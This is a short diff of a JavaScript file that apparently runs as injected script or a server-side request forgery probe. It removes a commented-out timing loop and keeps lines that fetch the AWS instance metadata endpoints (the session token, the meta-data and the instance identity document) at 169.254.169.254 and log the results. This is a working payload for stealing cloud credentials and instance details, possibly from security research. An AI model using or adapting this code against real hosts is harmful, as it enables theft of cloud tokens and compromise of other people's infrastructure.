@@ -25,15 +25,6 @@ function get(url) {
 }
 
 log('Triggered in ' + window.location.href);
-
-/*
-for(var i = 0; i < 60; ++i) {
-    log('Loop ' + i);
-    var req = new XMLHttpRequest();
-    req.open('GET', 'http://' + logTimeServer + '/', false);
-    req.send();
-}
-*/
 log('Token: ' + get('http://169.254.169.254/latest/api/token'));
 log('Meta Data: ' + get('http://169.254.169.254/latest/meta-data'));
 log('Document: ' + get('http://169.254.169.254/latest/dynamic/instance-identity/document'));
